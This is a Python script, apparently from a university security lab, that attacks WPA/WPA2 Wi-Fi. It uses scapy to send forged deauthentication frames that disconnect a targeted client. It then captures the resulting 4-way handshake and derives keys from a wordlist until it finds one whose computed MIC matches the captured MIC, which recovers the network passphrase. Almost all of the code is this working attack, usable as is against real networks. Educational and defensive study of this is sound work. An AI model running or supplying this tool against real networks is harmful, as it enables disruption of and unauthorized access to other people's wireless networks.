#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA). On vérifie également que le mic du fichier cap
correspond au mic de la passphrase définit
"""

__author__      = "Stefan Dejanovic et Nathanael Mizutani"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "stefan.dejanovic@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Checking if we put all the argument
if len(sys.argv) != 5:
    print("Please add arguments to use the script")
    print("1 argument SSID")
    print("2 argument: BSSID Client")
    print("3 argument: BSSID of AP")
    print("4 argument: Interface")
    exit()


# Array to store the Authenticator nonce and the Supplicant nonce
global nonces
nonces = []

global pktList
pktList = []
# Define the deauthification
pkt = RadioTap() / Dot11(addr1=sys.argv[2], addr2=sys.argv[3], addr3=sys.argv[3]) / Dot11Deauth(bytes(7))

# Send the deauthification
for x in range(0, 15):
    sendp(pkt, iface=sys.argv[4], verbose=False)

global mic_to_test
mic_to_test = ""

ssid = sys.argv[1]

def pkt_callback(pkt):

    # Read the passphrase from the file wordlist
    passPhrases = open("wordlist","r").read().split("\n")  

    A = "Pairwise key expansion" #this string is used in the pseudo-random function

    #cf "Quelques détails importants" dans la donnée
    data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")

    if pkt.haslayer(EAPOL) :

        # We supposed that the handshake packets are arriving in the correct order and one after another
        pktList.append(pkt)

        if(len(pktList) == 4):
            # Authenticator and Supplicant Nonces
            # We transform them to the correct encoding
            ANonce      = a2b_hex(pktList[0].getlayer(Raw).load.hex()[26:90])
            SNonce      = a2b_hex(pktList[1].getlayer(Raw).load.hex()[26:90])

            APmac = a2b_hex((pktList[0][Dot11].addr3).replace(":",""))
            Clientmac = a2b_hex((pktList[0][Dot11].addr1).replace(":", ""))

            # This is the MIC contained in the 4th frame of the 4-way handshake
            # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
            mic_to_test = pktList[3].getlayer(Raw).load.hex()[154:-4]
            print("[*] MIC found: " + mic_to_test)

            B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function


            for passPhrase in passPhrases :

                # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
                passPhrase = str.encode(passPhrase)

                pmk = pbkdf2(hashlib.sha1,passPhrase, str.encode(ssid), 4096, 32)
                
                # expand pmk to obtain PTK
                ptk = customPRF512(pmk,str.encode(A), B)

                # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
                mic = hmac.new(ptk[0:16],data,hashlib.sha1)

                print(mic.hexdigest())
                if mic.hexdigest()[:len(mic_to_test)] == mic_to_test:
                    print("[*] The passphrase (" + str(passPhrase) + ") is correct")
                    exit()

            print("[*] The passphrase: " + str(passPhrase) +" is not correct. Try with a different passphrase")
                    


print("[*] Start sniffing...")
sniff(iface=sys.argv[4], prn=pkt_callback)
print("[*] Stop sniffing")




